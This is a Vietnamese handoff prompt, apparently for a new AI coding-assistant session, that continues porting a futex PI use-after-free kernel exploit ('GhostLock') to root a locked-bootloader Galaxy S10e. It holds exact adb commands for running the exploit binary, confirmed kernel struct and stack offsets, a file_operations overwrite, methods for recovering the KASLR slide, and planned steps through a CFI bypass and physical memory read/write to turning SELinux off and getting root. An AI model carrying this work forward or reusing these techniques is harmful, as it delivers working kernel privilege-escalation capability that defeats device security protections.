# PROMPT BÀN GIAO — Phiên 3 (GhostLock port SM-G970W / 4.14.190)

> Dán nguyên khối này vào đầu phiên mới. Nguồn sự thật chi tiết: `E:\Library\Desktop\ghostlock\BAN_GIAO.md`
> (§12–§21) và `PHIEN_2026-10-10.md` (§9–§12). Đọc **§19, §20, §21** trước.

## 0. Mục tiêu

Root **SM-G970W (Galaxy S10e, Snapdragon 855, kernel 4.14.190, bootloader khoá cứng)** bằng port
**GhostLock** (CVE-2026-43499, futex PI use-after-free) — **root KHÔNG cần mở BL**. Trần:
`MODULE_SIG_FORCE=y` ⇒ không KernelSU, chỉ root tạm (+ SELinux off).

## 1. Trạng thái hiện tại (đã chứng minh — ĐỪNG làm lại)

- **PI write / fops redirect ĐÃ CHẠY** ✓ (không panic): bằng chứng log run `QU`/`QV`:
  `cons peek succ=1`, `page[0x10] = &waiter`, `page[0x108] = ffffffc002bb1760`
  (= `data_addr(ASHMEM_MISC_FOPS)`) ⇒ `*(ashmem_misc.fops) = fake_fops` đã ghi; walk trả về trong **5 ms**.
- **Baseline chạy SẠCH, không reboot** ✓ bằng `ONLY_FOPS=1` (build `ghostlockQV_a64`).
- Chuỗi 3 sửa đưa tới đó (đang bật qua env):
  1. `SSOPT_EMPTY=1` + **leak `waiter` trong T** (route) ⇒ `SSOPT_FAKE_TASK=1`, `SSOPT_OWNER0=0`;
  2. `PSELECT_ROUTE_DELAY_USEC=0` (đã bỏ clamp 20 ms cũ trong route);
  3. `SSOPT_PEEK=1` để xem trang giả sau walk (chẩn đoán).
- **Tường hiện tại: KASLR slide cho bảng fops giả** ⇒ `cfi write ret=-1 errno=22`.
- Pha **W1/W2** (sau mode-4) vẫn crash — vấn đề *riêng*, đang tránh bằng `ONLY_FOPS=1`.

## 2. Lệnh chạy chuẩn (đã xác nhận, KHÔNG tốn reboot)

```bash
# trên adb (Windows), chạy tách rời để không đứt kết nối:
adb push ghostlockQV_a64 /data/local/tmp/ghostlockQV
adb shell "chmod 755 /data/local/tmp/ghostlockQV"
adb shell "cd /data/local/tmp && rm -f gl.log; nohup sh -c 'ONLY_FOPS=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 NO_SLIDE=1 timeout 90 ./ghostlockQV > gl.log 2>&1' >/dev/null 2>&1 & echo STARTED"
# đọc:
adb shell "ls -la /data/local/tmp/gl.log; grep -a 'cons peek' /data/local/tmp/gl.log; grep -a cfi /data/local/tmp/gl.log | head -6; grep -a ONLY_FOPS /data/local/tmp/gl.log"
```
Kỳ vọng sạch: `cons peek succ=1`, `page[0x108]=ffffffc002bb1760`, `cfi write ret=-1 errno=22`,
`ONLY_FOPS: stop after fops redirect`, máy **không** reboot.

Build (WSL): `bash /mnt/e/Library/Desktop/ghostlock/build14.sh /tmp/ghostlockXX` (script copy ra
`…/ghostlockXX_a64` — **đổi tên mỗi lần** để không đè bản cũ).

## 3. Việc kế tiếp (theo thứ tự)

### (A) CHỐT KASLR SLIDE cho bảng fops giả — ưu tiên 1

Đã biết:
- `kaslr_image_addr()` trong `src/core/util.c`: `if (!kaslr_done) return image_addr;` ⇒ mọi
  `text_addr()` = địa chỉ image **không slide** ⇒ bảng fops giả trỏ sai hàm ⇒ `errno=22`.
- `leak_kernel_base()` (fops.c ~817) đọc con trỏ thật của ashmem fops qua `kernel_read64(fd,…)`
  ⇒ **cần fake fops đã chạy** ⇒ **vòng tròn**, không dùng để lấy slide trước CFI.
- Cách inject (chưa có, cần thêm):
  ```c
  kaslr_base = KIMAGE_TEXT_BASE + slide;   /* slide = base_runtime - KIMAGE_TEXT_BASE */
  kaslr_done = 1;                          /* đặt TRƯỚC prepare_skb_payload() */
  ```
  Đề xuất: env `SLIDE=0x…` xử lý trong `init_p0_profile()` (util.c) hoặc đầu `run_exploit()`.

⚠️ **Bẫy đã gặp (phải chốt bằng bằng chứng, đừng đoán):** slide suy từ kallsyms không nhất quán
(từ dump kppc: `pc : rt_mutex_adjust_prio_chain+0x2ec` với `PC: 0xffffff8008223198` ⇒ 0x16FFFC0;
chỗ khác lại ra 0x170000). Việc cần làm:
1. Trong một dump có dòng `PC: 0x<địa chỉ>:` (một số dump in), ghép với `pc : <symbol>+<off>`
   ⇒ có **một cặp (symbol, địa chỉ tuyệt đối) đáng tin**.
2. Đối chiếu cặp đó với `~ghostlock/kernel/kallsyms_fixed.txt` ⇒ biết bảng kallsyms có tin được
   không, và **slide là bội của 0x10000 hay 0x1000**.
3. Kiểm nhanh khác: `adb shell "head -3 /proc/kallsyms"` — nếu địa chỉ **không bị zero** thì lấy
   slide trực tiếp (nhanh nhất).
4. (Tự động hoá, sau khi biết alignment) Lấy slide tại runtime từ **kernel IP trong sample perf**
   (đã có sẵn trong `ssopt_perf_drain`): 16 bit thấp của IP *bất biến* theo slide nếu slide là bội
   của 0x10000 ⇒ so với symbol đã biết (`SyS_setsockopt`=0x…8f54, `sock_setsockopt`=0x…eafc)
   ⇒ `slide = IP − symbol_unslid`; đòi hỏi **nhiều IP cho cùng một slide** để chắc chắn.

Sau khi có slide: chạy lại lệnh §2 **có `SLIDE=0x…`** (bỏ `NO_SLIDE`) ⇒ kỳ vọng `cfi write` **thành
công** (`cfi write ret=<len>`), rồi `cfi fops_before == fake_fops` ⇒ đi tiếp `try_cfi_stage()`.

### (B) Sau slide: bỏ `ONLY_FOPS`, đi tiếp CFI → physrw → root
- `try_cfi_stage()`: configfs → pipe physrw → (SELinux off / UMH root).
- **Phải port** các hằng `PIPE_TMP_PAGE_OFF/BUFS_OFF/USER_OFF/SIZE` của `target.h` (đang là 5.x;
  4.14 thật: `tmp_page@0x68, bufs@0x80, user@0x88, sizeof≈0x90`) — xem BAN_GIAO §10.

### (C) Pha W1/W2 crash — chẩn đoán riêng khi cần (không chặn đường UMH/mode-4)

## 4. Các cờ & hằng số (đã có trong code)

- Cờ chính: `ONLY_FOPS`, `SSOPT_EMPTY`, `SSOPT_FAKE_TASK`, `SSOPT_OWNER0`, `SSOPT_PEEK`,
  `SSOPT_NO_CFI`, `SSOPT_HOLD`, `SSOPT_QUIET_EXIT`, `PSELECT_ROUTE_DELAY_USEC=0`,
  `ROUTE_SETSOCKOPT=1`, `NO_SLIDE=1`, `KPHYS=`, `WAITER_LO14=` (mặc định 0x3d10),
  `SSOPT_LOCKPROBE`, `SSOPT_SCAN`, `SSOPT_SCAN2`, `SSOPT_RANGE`, `SSOPT_BASELINE`,
  `SSOPT_LOG`, `WRITE4_SCRATCH`.
- Hằng hình học đã xác nhận: `sock_setsockopt` frame 0x180, `buf = SP0-0x1c0`;
  `SyS_setsockopt` 0x50; waiter `= SP0-0x1b0 = buf+0x10`; `task@buf[0x40]`, `lock@buf[0x48]`,
  `prio@buf[0x50]`, `deadline@buf[0x58]`; **`waiter = (SP & ~0x3fff) | 0x3d10`**;
  `FAKE_WAITER_PRIO=140`, `FAKE_TASK_PRIO=120`; page: `LOCK_OFF+0x18 = owner` (owner=0 khi
  `SSOPT_OWNER0=1`; W0 prio 100 khi đó).
- Script patch đã viết (trong `E:\Library\Desktop\ghostlock\`): `patch_ssopt_*.py`,
  `patch_leak_in_T.py`, `patch_delay_clamp.py`, `patch_only_fops.py`,
  `patch_waiter_leak*.py`, `patch_nodeprobe.py`, `patch_task_alias.py`, `patch_early_fsync.py`,
  `patch_cons_peek.py`, `patch_fops_offsets.py` (đã revert — target.h chỉ là fallback).
- Công cụ đọc dump: **`kp_scan.py`** (bắt buộc — dump là **ZIP**, member `dumpstate_lastkmsg.lst`),
  `_last.py`, `_grep_dump.py`, `_x25.py`, `show_crash.py`.

## 5. Quy tắc vận hành (bắt buộc — đã trả giá nhiều lần)

1. **Thiết kế/thảo luận trước khi code**; mọi thay đổi phải suy từ source/disasm, **không tune mù**.
2. Log phải **fsync** (đã có); panic/kill không có fsync ⇒ `gl.log` = **0 byte**.
3. Chạy **tách rời** (`nohup sh -c '… &'`) ⇒ adb không đứt giữa lệnh; đó cũng là cách chạy tay.
4. Sau reboot **chờ 2–3 phút**, kiểm `uptime`; sau mỗi run kiểm **mtime `gl.log`** (không đổi = lệnh
   đã KHÔNG chạy).
5. Đọc dump: `zcat` **không** đọc được (ZIP!) ⇒ `python3 kp_scan.py <dump>`; tra theo **tên tiến
   trình**; `Unable to handle` = Oops; `Call trace` + `sec_debug_pm_restart` = panic (đường reset
   của panic, **không** phải watchdog riêng — trace `lpm_cpuidle_enter` chỉ là các CPU idle).
6. Dùng `ONLY_FOPS=1` khi chỉ cần kiểm chứng mode-4 (**không tốn reboot**).
7. Không đụng `~/repos/deb-native`; build toolchain trên WSL; `adb` trên Windows
   (`E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe`).

## 6. Đã đóng — ĐỪNG thử lại

`ppoll` (không sơn được waiter: mảng pollfd ở `SP0-0x3f4`); `select()` làm hold (stack_fds 256 B
trùm waiter ⇒ `x24=0`); `CONFIG_SYSVIPC=n` ⇒ `semop/msg*` = ENOSYS; "bảng fops lệch +8" (mình đọc
ngược nhãn log — bảng beyond0q **đúng**); `kallsyms_fixed.txt` có thể lệch ⇒ **kiểm bằng byte
pattern / cặp symbol↔địa chỉ** trước khi tin.
